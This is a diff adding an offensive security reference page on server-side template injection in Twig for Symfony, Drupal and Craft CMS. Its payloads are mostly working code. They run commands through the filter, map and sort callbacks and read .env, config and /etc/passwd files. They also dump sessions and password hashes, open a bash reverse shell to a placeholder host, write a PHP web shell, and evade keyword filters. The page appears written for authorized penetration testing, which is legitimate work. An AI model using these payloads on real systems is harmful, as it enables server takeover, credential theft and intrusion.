@@ -1,0 +1,207 @@
+---
+title: Twig (PHP - Symfony, Craft, Drupal 8+)
+description: SSTI exploitation in Twig - _self.env mappers, filter abuse, and RCE paths for Symfony and Drupal stacks.
+mitre: [T1190, T1059.004]
+d3fend: [D3-EAL]
+impact: [ServerSideEval, RCE, FileRead]
+sidebar:
+  order: 4
+  label: Twig
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Twig in unsafe mode (legacy Symfony, custom embeds, untrusted-template scenarios) gives direct access to PHP functions via `_self.env`. Sandbox mode (default since Twig 2.x) blocks the obvious paths but is bypassable through filter abuse.
+
+```
+# Confirm Twig (not Jinja2)
+{{7*'7'}}                                    # → 49 (numeric coerce, vs. Jinja's 7777777)
+
+# Loot - Symfony Request
+{{_self.env.getRuntimeLoader().getSourceContext('@app/config/services.yaml').getCode()}}
+
+# RCE - unsafe Twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter("system")}}                  # Twig >= 1.36 - runs `id` via system()
+{{['id']|map("system")|join(",")}}           # alternate
+```
+
+Success indicator: `uid=` line from `id` or file contents in response.
+
+## Where this engine lives
+
+- **Symfony** - Twig is the default templating engine since Symfony 2. Sinks are anywhere `$twig->render()` is called with user input - most commonly in admin "email template" editors or report builders.
+- **Drupal 8+** - uses Twig for theming. Twig in Drupal runs in sandbox mode by default; bypasses are more relevant here than the unsafe-mode payloads.
+- **Craft CMS** - Twig in admin context. The CMS exposes additional helpers (`craft.app.config`) that widen the loot surface.
+- **Grav CMS, Bolt CMS** - flat-file PHP CMSes that use Twig directly.
+- **Custom PHP apps** - anything embedding `Twig\Environment` for email/report generation.
+
+## Step 1 - Confirm and orient
+
+```
+{{7*7}}                          # → 49        confirms template eval
+{{7*'7'}}                        # → 49        confirms Twig (not Jinja2)
+{{_self}}                        # object dump: __TwigTemplate_<hash> - confirms Twig
+```
+
+`{{_self}}` is the cleanest Twig fingerprint. If it returns a `__TwigTemplate_*` object representation, you have Twig and can reach the environment via `_self.env`.
+
+## Step 2 - Sandbox detection
+
+Twig has two modes:
+
+- **Unsafe** - `_self.env.getFilter("system")` works; arbitrary PHP function calls are reachable
+- **Sandbox** - only allowlisted tags/filters/functions; most useful payloads are blocked
+
+Test:
+
+```
+{{_self.env}}
+```
+
+- Returns object → unsafe mode. Continue to RCE paths below.
+- Returns empty / error → sandbox. Skip to filter-abuse paths or [filter bypass](/codex/web/server-side/ssti/filter-bypass/).
+
+## Step 3 - RCE paths (unsafe mode)
+
+### Path A - `_self.env.registerUndefinedFilterCallback` (Twig ≤ 1.x)
+
+The classic. Register `exec` as the fallback filter, then invoke any command name as a filter:
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
+```
+
+Works on Twig 1.x. The `registerUndefinedFilterCallback` method was removed in Twig 2.x.
+
+### Path B - `filter` / `map` against function names (Twig ≥ 1.36, including 2.x and 3.x)
+
+The `filter`, `map`, `reduce`, and `sort` filters accept a callback. PHP function names are callable strings:
+
+```
+{{['id']|filter('system')}}
+{{['id']|map('system')|join(',')}}
+{{['/etc/passwd']|map('file_get_contents')|join('')}}
+{{['id', 'uname -a']|map('system')|join('---')}}
+```
+
+These paths often bypass naive filtering that blocks `_self`, `env`, or `__class__`.
+
+### Path C - `sort` with callback
+
+```
+{{['cat /etc/passwd']|sort('system')}}
+```
+
+Same mechanism via the `sort` filter - useful when `filter` and `map` are blocked specifically.
+
+## Step 4 - File read in sandbox mode
+
+Sandbox mode usually allows the `source` and `include` constructs, which read files from the template loader's root:
+
+```
+{{ source('config.yaml') }}
+{% include 'config.yaml' %}
+```
+
+Path is loader-relative - usually the app's templates directory. Try `../` traversal:
+
+```
+{{ source('../config/services.yaml') }}
+{{ source('../.env') }}
+```
+
+For Drupal, the loader is often pinned and traversal fails, but `source` against absolute paths works on some configurations:
+
+```
+{{ source('@app/config/parameters.yaml') }}
+{{ source('@kernel/.env') }}
+```
+
+The `@app`, `@kernel`, `@root` namespaces depend on the application's Twig configuration.
+
+## Step 5 - Drupal-specific paths
+
+Drupal 8+ adds Twig filters that include their own callable mechanisms. Several were retroactively patched but appear on unpatched installs:
+
+```
+# Old CVE-2017-6920 vector
+{{ ['id'] | filter('passthru') }}
+
+# Drupal-specific helper, often unrestricted
+{{ ['id', null]|reduce('passthru') }}
+```
+
+Drupal also exposes `attach_library`, `link`, and `path` helpers that don't lead to RCE but reveal internal structure.
+
+## Step 6 - Symfony-specific loot
+
+When you have `_self.env`, the Symfony container is reachable:
+
+```
+{{_self.env.getRuntimeLoader()}}
+{{_self.env.getGlobals()}}                   # often contains 'app' (Symfony app reference)
+```
+
+`app.session`, `app.user`, `app.request` are commonly exposed:
+
+```
+{{app.request.cookies}}
+{{app.session.all}}
+{{app.user.password}}                        # hashed, but useful
+```
+
+If `app.environment` returns `dev`, the application is running in dev mode - the symfony profiler is likely accessible, which gives full DB queries, environment variables, and session data without further exploitation.
+
+## Reverse shell
+
+Standard PHP reverse shell via `system`:
+
+```
+{{['bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"']|map('system')|join('')}}
+```
+
+For environments with strict outbound filtering, write a web-shell file then access it:
+
+```
+{{['<?php echo shell_exec($_GET["c"]); ?>', '/var/www/public/x.php']|map('file_put_contents')}}
+```
+
+Then visit `/x.php?c=id`. File write requires the web server user to have write access to a web-served directory - common in containerized deployments.
+
+## Filter-aware variants
+
+When `_self`, `env`, or specific function names are filtered, see [filter bypass](/codex/web/server-side/ssti/filter-bypass/). Quick previews:
+
+```
+# String concatenation of blocked keyword
+{{['id']|filter('sys'~'tem')}}                # bypasses literal 'system' match
+
+# Hex-encoded function name (Twig accepts strings as callables)
+{{['id']|filter('\x73ystem')}}
+
+# Attribute access via string indexing (Twig supports this)
+{{_self['env']['registerUndefinedFilterCallback']('exec')}}{{_self['env']['getFilter']('id')}}
+```
+
+## Detection-only payloads
+
+```
+{{7*7}}                                      # eval probe
+{{7*'7'}}                                    # Twig-vs-Jinja2 probe (returns 49)
+{{_self}}                                    # → __TwigTemplate_<hash> object
+{{dump()}}                                   # dev mode: dumps current scope; prod: nothing
+```
+
+## Notes
+
+- **Twig 3.x** removed several legacy paths. The `filter`/`map`/`reduce`/`sort`-with-callback method still works as of Twig 3.10.
+- **Sandbox mode** is the default since Twig 2.x for any template rendered via `Twig\Sandbox\SecurityPolicy`. Most production Symfony apps run in sandbox. Drupal pins to sandbox tightly.
+- **`{% verbatim %}` blocks** in Twig disable evaluation - useful to know if your probe lands inside one (you'll see literal `{{...}}` even though the engine is Twig).
+- **Error visibility** - Symfony's prod mode swallows template errors. If a probe seems to produce no output, switch the test to a probe that doesn't throw (`{{1+1}}` instead of `{{undefined_var.method()}}`).
+
+<Aside type="caution">
+Twig SSTI on Symfony admin panels is a complete-takeover bug - the admin Twig context typically has `app.user` access and database query helpers. Demonstrate at the configuration-dump stage and stop there unless scope explicitly authorizes RCE.
+</Aside>
